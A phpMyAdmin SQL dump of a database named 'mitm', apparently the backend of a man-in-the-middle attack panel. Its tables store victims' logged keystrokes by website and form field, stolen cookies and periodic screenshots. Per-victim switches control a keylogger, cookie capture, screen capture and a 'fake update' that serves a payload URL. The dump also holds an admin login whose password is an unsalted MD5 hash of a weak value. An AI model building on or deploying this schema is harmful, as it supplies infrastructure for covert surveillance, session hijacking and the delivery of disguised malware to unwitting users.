-- phpMyAdmin SQL Dump
-- version 4.1.14
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: Jul 28, 2015 at 08:27 PM
-- Server version: 5.6.17
-- PHP Version: 5.5.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";

--
-- Database: `mitm`
--

-- --------------------------------------------------------

--
-- Table structure for table `admins`
--

CREATE TABLE IF NOT EXISTS `admins` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(30) NOT NULL,
  `password` varchar(32) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `admins`
--

INSERT INTO `admins` (`id`, `username`, `password`) VALUES
(2, 'admin', '81dc9bdb52d04dc20036dbd8313ed055');

-- --------------------------------------------------------

--
-- Table structure for table `clients`
--

CREATE TABLE IF NOT EXISTS `clients` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `client_id` varchar(32) NOT NULL,
  `ip` varchar(15) NOT NULL DEFAULT '',
  `browser` varchar(50) NOT NULL DEFAULT '',
  `browser_ver` varchar(50) NOT NULL DEFAULT '',
  `platform` varchar(50) NOT NULL DEFAULT '',
  `keylogger` enum('on','off') NOT NULL DEFAULT 'on',
  `cookies` enum('on','off') NOT NULL DEFAULT 'on',
  `screen_capture` enum('on','off') NOT NULL DEFAULT 'off',
  `scr_cap_interval` int(10) NOT NULL DEFAULT '60',
  `fake_update` enum('on','off') NOT NULL DEFAULT 'off',
  `payload_url` varchar(255) NOT NULL DEFAULT '',
  `first_added` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `client_id` (`client_id`),
  KEY `ip` (`ip`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `cookies`
--

CREATE TABLE IF NOT EXISTS `cookies` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `client_id` varchar(32) NOT NULL,
  `unique_id` varchar(32) NOT NULL,
  `website` varchar(255) NOT NULL DEFAULT '',
  `cookie` text,
  `time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  UNIQUE KEY `unique_id` (`unique_id`),
  KEY `client_id` (`client_id`),
  KEY `website` (`website`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `fake_update`
--

CREATE TABLE IF NOT EXISTS `fake_update` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `client_id` varchar(32) NOT NULL,
  `unique_id` varchar(32) NOT NULL,
  `website` varchar(255) NOT NULL DEFAULT '',
  `remove` enum('yes','no') NOT NULL,
  `time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  UNIQUE KEY `unique_id` (`unique_id`),
  KEY `client_id` (`client_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `keylogger`
--

CREATE TABLE IF NOT EXISTS `keylogger` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `client_id` varchar(32) NOT NULL,
  `keylog_id` varchar(32) NOT NULL,
  `unique_id` varchar(32) NOT NULL,
  `page_load` int(8) NOT NULL,
  `website` varchar(255) NOT NULL DEFAULT '',
  `field_name` varchar(255) NOT NULL DEFAULT '',
  `keylog_data` text,
  `time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  UNIQUE KEY `unique_id` (`unique_id`),
  KEY `client_id` (`client_id`),
  KEY `keylog_id` (`keylog_id`),
  KEY `page_load` (`page_load`),
  KEY `website` (`website`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `screen_capture`
--

CREATE TABLE IF NOT EXISTS `screen_capture` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `client_id` varchar(32) NOT NULL,
  `screencap_id` varchar(32) NOT NULL,
  `image_id` varchar(32) NOT NULL,
  `page_load` int(8) NOT NULL,
  `website` varchar(255) NOT NULL DEFAULT '',
  `time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  UNIQUE KEY `image_id` (`image_id`),
  KEY `client_id` (`client_id`),
  KEY `screencap_id` (`screencap_id`),
  KEY `website` (`website`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `timeline`
--

CREATE TABLE IF NOT EXISTS `timeline` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `client_id` varchar(32) NOT NULL,
  `unique_id` varchar(32) NOT NULL,
  `page_load` int(8) NOT NULL,
  `website` varchar(255) NOT NULL DEFAULT '',
  `type` enum('keylog','cookie','screencap','fake_update') NOT NULL,
  `time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  UNIQUE KEY `unique_id` (`unique_id`),
  KEY `client_id` (`client_id`),
  KEY `page_load` (`page_load`),
  KEY `website` (`website`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
